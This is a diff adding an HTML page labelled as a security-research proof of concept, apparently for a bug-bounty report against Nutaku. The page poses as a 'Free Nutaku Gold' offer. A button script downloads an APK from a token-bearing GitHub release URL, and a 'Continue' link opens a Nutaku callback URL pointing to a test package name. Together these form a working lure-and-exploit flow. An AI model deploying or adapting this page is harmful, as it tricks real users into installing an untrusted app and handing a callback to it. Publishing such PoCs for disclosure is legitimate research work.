@@ -1,1 +1,203 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Free Nutaku Gold — Security Research PoC</title>
 
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    font-family: Arial, sans-serif;
+    color: white;
+    background:
+        radial-gradient(circle at top, #542276 0%, #24102f 40%, #0d0712 100%);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 25px;
+}
+
+.card {
+    width: 100%;
+    max-width: 600px;
+    background: rgba(22, 12, 31, .97);
+    border: 1px solid #63367b;
+    border-radius: 14px;
+    padding: 35px;
+    box-shadow: 0 20px 60px rgba(0,0,0,.55);
+}
+
+.warning {
+    background: #f0ad00;
+    color: #181008;
+    padding: 10px;
+    text-align: center;
+    border-radius: 8px;
+    font-weight: bold;
+    font-size: 12px;
+    margin-bottom: 25px;
+}
+
+.logo {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.logo svg {
+    width: 230px;
+}
+
+h1 {
+    text-align: center;
+    margin: 10px 0;
+    font-size: 34px;
+}
+
+.subtitle {
+    text-align: center;
+    color: #c8b5d2;
+    margin-bottom: 30px;
+}
+
+.step {
+    background: #170d20;
+    border: 1px solid #392344;
+    border-radius: 10px;
+    padding: 20px;
+    margin-bottom: 15px;
+}
+
+.step-number {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: #893bc0;
+    font-weight: bold;
+    margin-right: 8px;
+}
+
+.step-title {
+    font-weight: bold;
+}
+
+p {
+    color: #bcaec4;
+    line-height: 1.5;
+}
+
+button, a {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    border: 0;
+    border-radius: 7px;
+    background: #8738bb;
+    color: white;
+    text-align: center;
+    text-decoration: none;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+button:hover, a:hover {
+    background: #a94bdc;
+}
+
+.notice {
+    text-align: center;
+    color: #998aa3;
+    font-size: 11px;
+    margin-top: 20px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="card">
+
+    <div class="warning">
+        SECURITY RESEARCH PoC — NOT AN OFFICIAL NUTAKU PAGE
+    </div>
+
+    <div class="logo">
+        <svg viewBox="0 0 500 110"
+             xmlns="http://www.w3.org/2000/svg">
+            <text x="250" y="76"
+                  text-anchor="middle"
+                  font-family="Arial Black, Arial, sans-serif"
+                  font-size="76"
+                  font-weight="900"
+                  fill="white">
+                NUTAKU
+            </text>
+        </svg>
+    </div>
+
+    <h1>Free Nutaku Gold</h1>
+
+    <div class="subtitle">
+        Follow the two steps below
+    </div>
+
+    <div class="step">
+        <div>
+            <span class="step-number">1</span>
+            <span class="step-title">Download and install the application</span>
+        </div>
+
+        <p>
+            Download and install the application used in this
+            security research demonstration.
+        </p>
+
+        <button onclick="downloadApk()">Download APK</button>
+
+<script>
+function downloadApk() {
+    const url = "https://release-assets.githubusercontent.com/github-production-release-asset/1028082948/0082591c-9cdc-46fe-86b1-4f64f79eb4fa?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-08-29T05%3A29%3A27Z&rscd=attachment%3B+filename%3Dapp-debug.apk&rsct=application%2Fvnd.android.package-archive&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-08-29T04%3A29%3A22Z&ske=2026-08-29T05%3A29%3A27Z&sks=b&skv=2018-11-09&sig=M%2BDhI7GpNMGb1YRMQeAB0bYlQ8FCP2xNOgC94tpVVPo%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc4Nzk3OTE0NiwibmJmIjoxNzg3OTc4ODQ2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.gwddhfPir8ssT-WbbFTh5BRCav-z9OCfdtgDuh0JJfE&response-content-disposition=attachment%3B%20filename%3Dapp-debug.apk&response-content-type=application%2Fvnd.android.package-archive";
+
+    const link = document.createElement("a");
+    link.href = url;
+    link.download = "app.apk";
+    document.body.appendChild(link);
+    link.click();
+    link.remove();
+}
+</script>
+    </div>
+
+    <div class="step">
+        <div>
+            <span class="step-number">2</span>
+            <span class="step-title">Open the callback link</span>
+        </div>
+
+        <p>
+            After downloading and installing the application,
+            click the link below.
+        </p>
+
+        <a href="https://www.nutaku.net/callback/open/app-gi?titleId=amazons-vs-zombies&apn=intigrittest&appType=apk">
+            Continue
+        </a>
+    </div>
+
+    <div class="notice">
+        Security research demonstration only.
+        This page is not affiliated with or endorsed by Nutaku.
+    </div>
+
+</div>
+
+</body>
+</html>
+```
